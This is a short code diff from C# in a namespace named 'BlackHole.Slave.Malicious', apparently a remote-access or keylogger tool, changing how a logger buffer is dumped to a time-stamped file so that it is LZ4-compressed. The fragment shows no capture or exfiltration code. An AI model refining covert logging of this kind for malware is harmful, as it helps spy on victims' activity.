@@ -226,7 +226,7 @@ namespace BlackHole.Slave.Malicious
 
             try
             {
-                File.WriteAllText(string.Format(filePath, DateTime.Now.ToString("dd_HH_mm")), m_logger.ToString());
+                File.WriteAllBytes(string.Format(filePath, DateTime.Now.ToString("dd_HH_mm")), Encoding.Default.GetBytes(m_logger.ToString()).CompressLz4());
                 m_logger.Clear();
             }
             catch(Exception e)
